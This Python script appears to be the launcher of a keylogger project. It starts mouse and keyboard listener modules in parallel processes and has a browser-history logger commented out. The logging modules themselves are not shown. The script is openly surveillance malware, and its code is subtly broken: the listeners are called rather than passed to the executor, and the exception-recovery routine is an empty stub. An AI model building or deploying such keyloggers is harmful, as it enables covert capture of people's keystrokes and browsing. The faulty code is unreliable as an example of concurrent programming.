import concurrent.futures
from multiprocessing import freeze_support
import mouse_keylogger
import keyboard_keylogger
from browser_history_logger import print_history
from test import printing


def call_functions_that_caused_exception(func_status):
    pass
    # TODO(): recall function if it is broked


def waiting():
    global mouse_disp, keyboard_disp, test_disp  # , browser_history_disp

    func_status = concurrent.futures.wait(fs=[mouse_disp, test_disp, keyboard_disp,
                                              # browser_history_disp
                                              ], return_when="FIRST_EXCEPTION")
    call_functions_that_caused_exception(func_status)


if __name__ == '__main__':
    # browser_history_disp = concurrent.futures.ProcessPoolExecutor().submit(print_history)
    test_disp = concurrent.futures.ProcessPoolExecutor().submit(printing)
    mouse_disp = concurrent.futures.ProcessPoolExecutor().submit(mouse_keylogger.mouse_listener())
    keyboard_disp = concurrent.futures.ProcessPoolExecutor().submit(keyboard_keylogger.keyboard_listener())

    waiting()
